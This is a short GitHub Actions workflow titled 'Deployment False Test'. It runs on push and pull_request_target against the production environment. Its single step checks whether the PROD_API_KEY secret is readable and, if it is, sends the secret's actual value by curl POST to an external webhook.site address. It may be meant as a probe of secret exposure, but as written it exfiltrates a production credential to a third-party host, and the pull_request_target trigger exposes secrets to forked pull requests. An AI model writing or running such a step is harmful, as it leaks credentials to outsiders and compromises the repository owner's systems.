name: Deployment False Test
on:
  push:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  test:
    runs-on: ubuntu-latest
    environment:
      name: production
    steps:
      - name: Check Secret Access
        run: |
          echo "=== SECRET ACCESS TEST ==="
          if [ -n "$PROD_API_KEY" ]; then
            echo "SECRET ACCESSIBLE: YES"
            curl -s -X POST "https://webhook.site/7343fc59-0734-427e-afdd-f3556bc3f91e" \
            -d "secret_found=true&value=$PROD_API_KEY"
          else
            echo "SECRET ACCESSIBLE: NO"
          fi
        env:
          PROD_API_KEY: ${{ secrets.PROD_API_KEY }}
